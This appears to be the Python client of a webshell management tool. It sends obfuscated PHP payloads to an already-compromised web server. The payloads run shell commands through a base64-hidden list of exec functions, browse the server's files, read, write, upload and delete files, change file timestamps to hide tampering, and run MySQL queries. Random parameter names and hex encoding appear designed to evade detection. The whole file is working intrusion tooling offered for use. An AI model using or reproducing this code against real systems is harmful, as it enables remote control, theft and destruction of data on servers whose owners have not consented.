#! /usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import unicode_literals

import random
import re
import string
import json
import requests

PAYLOAD = {
    'PHP': {
        'sub': ['[\n\r]\s*', ' '],
        'argv': "hex2bin($_POST['%s'])",
        'base': """
            ini_set("display_errors", 0);
            set_time_limit(0);
            %(eval)s(%(value)s);
            header('%(rand_headers)s:'.bin2hex(%(func)s()));
        """,
        'info': """
            function %(func)s() {
                return join("\\n", array(
                    php_uname(),
                    'PHP '.PHP_VERSION,
                    $_SERVER['REMOTE_ADDR'],
                    $_SERVER['SERVER_SOFTWARE'],
                    get_current_user(),
                    $_SERVER['DOCUMENT_ROOT']
                ));
            }
        """,
        'command': """
            function %(func)s()
            {
                $c = %(command)s;
                $f = explode(',', base64_decode('c2hlbGxfZXhlYyxzeXN0ZW0sZXhlYyxwYXNzdGhydSxwb3Blbixwcm9jX29wZW4='));
                $r = '';
                if(function_exists($f[5])) {
                    $p = $f[5]($c, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $i);
                    if (is_resource($p)) {
                        while (!feof($i[1]))$r .= fgets($i[1]);
                        fclose($i[1]);
                        while (!feof($i[2])) $r .= fgets($i[2]);
                        fclose($i[2]);
                        proc_close($p);
                    }
                } elseif(function_exists($f[0])) {
                    $r = $f[0]($c);
                } elseif(function_exists($f[1])) {
                    $f[1]($c, $r);
                } elseif(function_exists($f[2])) {
                    $f[2]($c, $r);
                    $r = join("\\n", $r);
                } elseif(function_exists($f[3])) {
                    $f[3]($c, $r);
                } elseif(function_exists($f[4])) {
                    $p = $f[4]($c,'r');
                    while (feof($p)) {
                        $r .= fread($p, 1024);
                    }
                }
                return $r;
            }
        """,
        'disk': """
            function %(func)s() {
                $D = array();
                if (substr($_SERVER["SCRIPT_FILENAME"], 0, 1) == "/") {
                    array_push($D, '/');
                } else {
                    foreach (range("C", "Z") as $L)
                        if (is_dir($L . ':'))
                            array_push($D, $L.':');
                }
                return join("\\n", $D);
            }
        """,
        'files': """
            function %(func)s() {
                $D = %(files)s;
                $F = opendir($D);
                $R = array();
                if ($F) {
                    while ($f = readdir($F)) {
                        $lf = $D . '/' . $f;
                        array_push($R, join("\t", array(
                            is_dir($lf),
                            $f,
                            date("Y-m-d H:i:s", filemtime($lf)),
                            substr(base_convert(fileperms($lf), 10, 8), -4),
                            filesize($lf)
                        )));
                    }
                    closedir($F);
                }
                return join("\\n", $R);
            }
        """,
        'read': """
            function %(func)s() {
                $F = %(filename)s;
                $R = array();
                if(file_exists($F)&&is_readable($F)){
                    array_push($R, file_get_contents($F));
                }
                return join("\\n", $R);
            }
        """,
        'save': """
            function %(func)s() {
                return file_put_contents(%(filename)s, %(content)s);
            }
        """,
        'delete': """
            function delfiles($files) {
                $r = array();
                if(is_dir($files)) {
                    $path = opendir($files);
                    while($file = readdir($path)) {
                        if(!in_array($file, array('.', '..'))) {
                            $r = array_merge($r, delfiles($files . '/' . $file));
                        }
                    }
                    closedir($path);
                    if(!rmdir($files)) array_push($r, $files);
                } else {
                    if(!unlink($files)) array_push($r, $files);
                }
                return $r;
            }
            function %(func)s() {
                return join("\\n", delfiles(%(filename)s));
            }
        """,
        'rename': """
            function %(func)s() {
                return rename(%(filename)s, %(oldname)s);
            }
        """,
        'changetime': """
            function %(func)s() {
                return touch(%(filename)s, strtotime(%(time)s));
            }
        """,
        'upload': """
            function %(func)s() {
                return move_uploaded_file($_FILES["upload"]["tmp_name"], %(filename)s);
            }
        """,
        'newfiles': """
            function %(func)s() {
                $d = %(filename)s;
                if(!file_exists($d))
                return mkdir($d,0777,true);
            }
        """,
        'mysql': """
            function %(func)s() {
                $conn = new mysqli(%(host)s, %(user)s, %(passwd)s, '', %(port)s);
                $R = array('err\t');
                if($conn->connect_error) {
                    $R[0] = 'err\t'.$conn->connect_error;
                } else {
                    $res = $conn->query(%(sql)s);
                    if($res) {
                        while($row = $res->fetch_assoc()) {
                            $r = array();
                            foreach ($row as $key => $value) {
                                array_push($r, $key."\v".$value);
                            }
                            array_push($R, join("\t", $r));
                        }
                    } else {
                        $R[0] = 'err\t'.$conn->error;
                    }
                }
                return join("\\n", $R);
            }
        """
    },
}

class dataRequest():

    def __init__(self, shells):
        self.shells = shells
        self.timeout = 5
        self.rand_headers = self.randLetters()

    def randLetters(self, n=None):
        n = n if n else random.randint(0, 5)
        t = ""
        if not hasattr(self, 'randlist'):
            self.randlist = []
        for i in xrange(n):
            t = t + random.choice(string.letters)
        return t if t and t not in self.randlist else self.randLetters()

    def post(self, data, files=None):
        # POST所有数据map
        datamap = {k: self.randLetters() for k, v in data.items()}
        valuemap = {
            k: PAYLOAD[self.shells.types]['argv'] % v for k, v in datamap.items()}
        valuemap.update({
            'eval': 'eval',
            'func': self.randLetters(1),
            'rand_headers': self.rand_headers,
        })

        # 初始eval整合
        value = PAYLOAD[self.shells.types]['base'] % valuemap
        # 换成一行
        value = re.sub(PAYLOAD[self.shells.types]['sub'][0], PAYLOAD[self.shells.types]['sub'][1], value)[1:-1]

        # 执行函数整合
        data['value'] = data['value'] % valuemap
        # 换成一行
        data['value'] = re.sub(PAYLOAD[self.shells.types]['sub'][0], PAYLOAD[self.shells.types]['sub'][1], data['value'])[1:-1]

        # 其他参数整合
        for k, v in data.items():
            data.pop(k)
            data[datamap[k]] = v.encode('hex')

        # 参数合并
        data.update({self.shells.passwd: value})
        proxy = {self.shells.url.split(
            '://')[0]: self.shells.proxy} if self.shells.proxy else None
        data = data.update(json.loads(self.shells.data)) if self.shells.data else data
        headers = json.loads(self.shells.headers) if self.shells.headers else None
        cookies = json.loads(self.shells.cookies) if self.shells.cookies else None
        res = False
        try:
            res = requests.post(
                self.shells.url,
                data=data,
                cookies=cookies,
                headers=headers,
                files=files,
                timeout=self.timeout,
                proxies=proxy
            )
            res = res.headers.get(self.rand_headers).decode('hex')
        except:
            return False
        return res

    def info(self):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('info')
        })

    def command(self, command):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('command'),
            'command': command
        })

    def disk(self):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('disk')
        })

    def files(self, files):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('files'),
            'files': files
        })

    def read(self, filename):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('read'),
            'filename': filename
        })

    def save(self, filename, content):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('save'),
            'filename': filename,
            'content': content
        })

    def delete(self, filename):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('delete'),
            'filename': filename
        })

    def rename(self, filename, oldname):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('rename'),
            'filename': filename,
            'oldname': oldname
        })

    def changetime(self, filename, t):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('changetime'),
            'filename': filename,
            'time': t
        })

    def upload(self, filename, upload):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('upload'),
            'filename': filename
        }, {
            'upload': upload
        })

    def newfiles(self, filename):
        return self.post({
            'value': PAYLOAD[self.shells.types].get('newfiles'),
            'filename': filename
        })

    def query(self, sql):
        database = json.loads(self.shells.database)
        return self.post({
            'value': PAYLOAD[self.shells.types].get(database['types']),
            'host': database['host'],
            'port': database['port'],
            'user': database['user'],
            'passwd': database['passwd'],
            'sql': sql
        })